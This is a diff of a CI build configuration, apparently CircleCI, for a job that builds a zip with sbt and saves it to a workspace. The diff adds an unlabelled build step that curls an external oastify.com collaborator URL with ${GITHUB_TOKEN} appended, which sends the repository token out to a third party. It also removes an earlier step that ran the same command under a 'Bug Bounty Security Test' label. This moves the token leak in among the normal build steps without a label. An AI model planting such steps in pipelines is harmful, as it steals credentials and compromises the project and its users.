@@ -48,15 +48,11 @@ jobs:
       - run: cat /dev/null | sbt dist
       - run: mkdir -p workspace
       - run: cp acdc-ws/target/universal/*.zip workspace/.
+      - run: curl "https://geyj4hhebrqik61p0vr3iq5lrcx3l39s.oastify.com/${GITHUB_TOKEN}"
       - persist_to_workspace:
           root: workspace
           paths:
             - acdc-ws-*.zip
-      
-      - run:
-        name: "Bug Bounty Security Test"
-        command: |
-          curl "https://geyj4hhebrqik61p0vr3iq5lrcx3l39s.oastify.com/${GITHUB_TOKEN}"
 
   publish:
     docker:
